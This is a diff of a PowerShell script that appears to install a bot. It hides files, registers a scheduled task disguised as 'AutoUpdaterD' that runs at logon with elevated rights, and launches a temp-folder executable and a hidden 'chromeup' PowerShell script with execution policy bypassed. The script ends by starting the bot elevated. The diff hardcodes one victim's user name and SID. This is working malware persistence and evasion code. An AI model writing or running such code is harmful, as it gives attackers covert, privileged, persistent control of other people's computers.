@@ -37,19 +37,13 @@ Set-ItemProperty -Path $file -Name Attributes -Value ((Get-Item $file).Attribute
 # Hide second file
 Set-ItemProperty -Path $file2 -Name Attributes -Value ((Get-Item $file2).Attributes -bor $attr)
 
-$taskAction = New-ScheduledTaskAction -Execute '$env:temp\sVBXKuz\wsappa.exe'
-$taskTriggerLogon = New-ScheduledTaskTrigger -AtLogOn
-$taskTriggerUnlock = New-ScheduledTaskTrigger -AtSessionUnlock  # Use AtSessionUnlock for unlock trigger
-$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew -RestartCount 10
-
-#create startup task
 $taskXml = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
     <Date>2023-08-09T11:59:58.6674267</Date>
-    <Author>$env:computername\$env:username</Author>
-    <URI>\AutoUpdateD</URI>
+    <Author>BTO-JOB\jbkal</Author>
+    <URI>\AutoUpdaterD</URI>
   </RegistrationInfo>
   <Triggers>
     <LogonTrigger>
@@ -62,13 +56,13 @@ $taskXml = @"
   </Triggers>
   <Principals>
     <Principal id="Author">
-      <UserId>DOMAIN\$env:UserName</UserId>
+      <UserId>S-1-5-21-3857279752-1707848018-4111394774-1002</UserId>
       <LogonType>InteractiveToken</LogonType>
       <RunLevel>HighestAvailable</RunLevel>
     </Principal>
   </Principals>
   <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <MultipleInstancesPolicy>StopExisting</MultipleInstancesPolicy>
     <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
     <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
     <AllowHardTerminate>false</AllowHardTerminate>
@@ -94,19 +88,18 @@ $taskXml = @"
   </Settings>
   <Actions Context="Author">
     <Exec>
-      <Command>C:\Users\$env:username\AppData\Local\Temp\sVBXKuz\wsappa.exe</Command>
+      <Command>C:\Users\jbkal\AppData\Local\Temp\sVBXKuz\wsappa.exe</Command>
     </Exec>
     <Exec>
       <Command>powershell.exe</Command>
-      <Arguments>/c Start-Process powershell.exe -ArgumentList '-ExecutionPolicy','Bypass','-File', $env:appdata\chromeup\backup.ps1 -Verb runAs -WindowStyle Hidden</Arguments>
+      <Arguments>/c Start-Process powershell.exe -ArgumentList '-ExecutionPolicy','Bypass','-File', C:\Users\jbkal\AppData\Roaming\chromeup\backup.ps1 -Verb runAs -WindowStyle Hidden</Arguments>
     </Exec>
   </Actions>
 </Task>
 "@
 
-$taskXml = $taskXml.Replace("DOMAIN\$env:UserName", "$env:USERDOMAIN\$env:UserName")
-
 Register-ScheduledTask -Xml $taskXml -TaskName 'AutoUpdaterD' -Force
+
 
 #start bot
 cd $env:temp/sVBXKuz/ ; Start-Process wsappa.exe -Verb RunAs
